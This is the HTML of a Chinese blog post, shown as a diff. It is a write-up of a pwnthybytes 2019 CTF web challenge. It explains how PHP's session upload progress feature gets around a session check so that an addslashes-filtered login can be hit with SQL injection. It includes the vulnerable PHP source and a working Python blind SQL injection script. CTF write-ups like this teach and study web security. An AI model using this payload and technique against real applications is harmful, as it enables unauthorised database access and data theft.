@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>pwnthybytes2019-Baby sql is not baby anymore - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">pwnthybytes2019-Baby sql is not baby anymore</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-初步思路"><span class="toc-text">1.初步思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-利用Session-Upload-Progress"><span class="toc-text">2.利用Session Upload Progress</span></a></li></ol>
+
+  <div class="post-content">
+    <p>pwnthybytes 2019 ctf的一道web题<br>环境目前还开着: <a href="http://137.117.210.176:13372" target="_blank" rel="noopener">http://137.117.210.176:13372</a></p>
+<h2 id="1-初步思路"><a href="#1-初步思路" class="headerlink" title="1.初步思路"></a>1.初步思路</h2><ul>
+<li>题目一开始的提示<blockquote>
+<p>I had problems in the past with SQLi so I searched for recommendations. I know for sure that PHP addslashes is a pain and nobody can bypass this</p>
+</blockquote>
+</li>
+</ul>
+<p>可以猜测和sql注入有关</p>
+<p>访问/source.zip拿到源码</p>
+<ul>
+<li>审计下可以发现index.php有一个全局的过滤,并且注册登陆的功能是依靠index.php去包含templates文件夹中其他文件实现的<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SESSION <span class="keyword">as</span> $key =&gt; $value): $_SESSION[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value): $_GET[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value): $_POST[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $key =&gt; $value): $_REQUEST[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">	!is_string($value) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Hacking attempt!"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> addslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]) <span class="keyword">AND</span> $_GET[<span class="string">'p'</span>] === <span class="string">"register"</span> <span class="keyword">AND</span> $_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> <span class="keyword">AND</span> <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">'templates/register.php'</span>);</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]) <span class="keyword">AND</span> $_GET[<span class="string">'p'</span>] === <span class="string">"login"</span> <span class="keyword">AND</span> $_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'GET'</span> <span class="keyword">AND</span> <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">'templates/login.php'</span>);</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]) <span class="keyword">AND</span> $_GET[<span class="string">'p'</span>] === <span class="string">"home"</span> <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">'templates/home.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>在没有宽字符注入的情况下addslashes几乎是不可能直接绕过的</li>
+</ul>
+<p>再看一看login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//如果没有session的话就退出</span></span><br><span class="line"><span class="comment">//注意login.php根本没有session_start()</span></span><br><span class="line">!<span class="keyword">isset</span>($_SESSION) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Direct access on this script is not allowed!"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'username'</span>];</span><br><span class="line">$sql = <span class="string">'SELECT `username`,`password` FROM `test`.`users` where `username`="'</span>.$_GET[<span class="string">'username'</span>].<span class="string">'" and password="'</span>.md5($_GET[<span class="string">'password'</span>]).<span class="string">'";'</span>;</span><br><span class="line">$result = $con-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($user)</span></span>&#123;</span><br><span class="line">	$_SESSION[<span class="string">'username'</span>] = $user;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">($result-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> $row = $result-&gt;fetch_assoc() <span class="keyword">AND</span> $con-&gt;close() <span class="keyword">AND</span> auth($row[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'&lt;meta http-equiv="refresh" content="0; url=?p=home" /&gt;'</span>)) <span class="keyword">OR</span> ($con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'Try again!'</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>login.php一开始有一个验证，如果不存在session的话就直接退出</li>
+<li>addslashes的全局过滤是写在index.php中的，如果有办法绕过这个session的验证直接访问login.php的话，就可以直接sql注入</li>
+<li>但是login.ph根本没有session_start(),因此直接访问login.php肯定是不行的</li>
+</ul>
+<h2 id="2-利用Session-Upload-Progress"><a href="#2-利用Session-Upload-Progress" class="headerlink" title="2.利用Session Upload Progress"></a>2.利用Session Upload Progress</h2><p>这是php5.4后的一个特性<br><a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/en/session.upload-progress.php</a></p>
+<ul>
+<li>php文档的描述:<blockquote>
+<p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li>最重要的是，upload_progress是不需要session_start()的</li>
+<li>php.ini中默认session.upload_progress.name值为PHP_SESSION_UPLOAD_PROGRESS,因此只要post一个名为PHP_SESSION_UPLOAD_PROGRESS的请求SESSION全局数据就会不为空，我们就可以进行布尔型盲注</li>
+</ul>
+<p>附上韩国大佬的脚本<a href="https://yelang123.tistory.com/77" target="_blank" rel="noopener">https://yelang123.tistory.com/77</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">result =<span class="string">''</span></span><br><span class="line">url = <span class="string">'http://127.0.0.1/'</span></span><br><span class="line">data = <span class="string">'''------WebKitFormBoundary8Jltb5vw5fWfSYS4</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">asdfasdfasdf</span></span><br><span class="line"><span class="string">------WebKitFormBoundary8Jltb5vw5fWfSYS4--'''</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span> : <span class="string">'PHPSESSID=yelang123;'</span>,</span><br><span class="line">   <span class="string">'Content-Type'</span>:<span class="string">'multipart/form-data; boundary=----WebKitFormBoundary8Jltb5vw5fWfSYS4'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">      payload = <span class="string">"/templates/login.php?username=1\"or if(ascii(substr((select group_concat(secret) from flag_tbl),&#123;1&#125;,1))=&#123;0&#125;,1,0)%23&amp;password=tlqkf12a"</span>.format(i,x);</span><br><span class="line">      r = requests.post(url+payload,headers=headers,data=data,proxies=&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;)</span><br><span class="line">      <span class="comment"># print(r.text)</span></span><br><span class="line">      <span class="keyword">if</span> <span class="string">"Try again!"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">         result += chr(i)</span><br><span class="line">         print(result)</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">continue</span>;</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-10-14</span>
+  </div>
+
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
